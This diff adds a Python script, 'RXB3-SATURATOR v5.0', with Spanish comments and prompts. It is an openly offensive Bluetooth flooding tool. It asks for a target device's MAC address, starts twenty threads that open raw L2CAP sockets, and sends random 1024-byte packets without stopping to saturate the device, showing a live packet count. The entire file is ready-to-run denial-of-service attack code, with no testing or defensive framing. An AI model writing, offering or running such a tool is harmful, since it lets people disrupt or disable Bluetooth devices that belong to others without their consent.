@@ -1,0 +1,71 @@
+#!/usr/bin/env python3
+import socket, struct, time, random, threading, os, sys
+
+# Usamos rich para el diseño, si no está usamos texto plano
+try:
+    from rich.console import Console
+    from rich.panel import Panel
+    console = Console()
+except ImportError:
+    class FakeConsole:
+        def print(self, m, **k): print(m)
+    console = FakeConsole()
+
+# Protocolo nativo L2CAP
+BTPROTO_L2CAP = 0
+
+class Rxb3Saturator:
+    def __init__(self):
+        self.running = False
+        self.stats = {'packets': 0, 'errors': 0, 'start_time': time.time()}
+    
+    def attack(self, target_mac):
+        while self.running:
+            try:
+                # Sockets nativos: No necesitan la librería 'bluetooth' externa
+                s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_L2CAP)
+                s.connect((target_mac, 0))
+                while self.running:
+                    s.send(os.urandom(1024))
+                    self.stats['packets'] += 1
+            except:
+                self.stats['errors'] += 1
+                time.sleep(0.05)
+
+def main():
+    os.system('clear')
+    banner = """
+    [bold red]
+    ██████╗ ██╗  ██╗██████╗ ██████╗ 
+    ██╔══██╗╚██╗██╔╝██╔══██╗╚════██╗
+    ██████╔╝ ╚███╔╝ ██████╔╝ █████╔╝
+    ██╔══██╗ ██╔██╗ ██╔══██╗ ╚═══██╗
+    ██║  ██║██╔╝ ██╗██████╔╝██████╔╝
+    ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ [/bold red]
+    [bold white]  >> RXB3-SATURATOR v5.0 << [/bold white]
+    """
+    console.print(banner, justify="center")
+    console.print("[bold cyan]Motor Nativo - Sin Dependencias Externas[/bold cyan]\n", justify="center")
+    
+    mac = input(" [?] Dirección MAC del objetivo: ").strip()
+    if len(mac) < 12:
+        print(" [!] Dirección MAC no válida.")
+        return
+
+    saturador = Rxb3Saturator()
+    saturador.running = True
+    
+    print(f"\n [!] Lanzando saturación contra: {mac}")
+    for _ in range(20):
+        threading.Thread(target=saturador.attack, args=(mac,), daemon=True).start()
+    
+    try:
+        while True:
+            print(f" [>] Paquetes: {saturador.stats['packets']} | Errores: {saturador.stats['errors']}", end="\r")
+            time.sleep(0.1)
+    except KeyboardInterrupt:
+        saturador.running = False
+        print("\n\n [✓] Proceso detenido.")
+
+if __name__ == "__main__":
+    main()
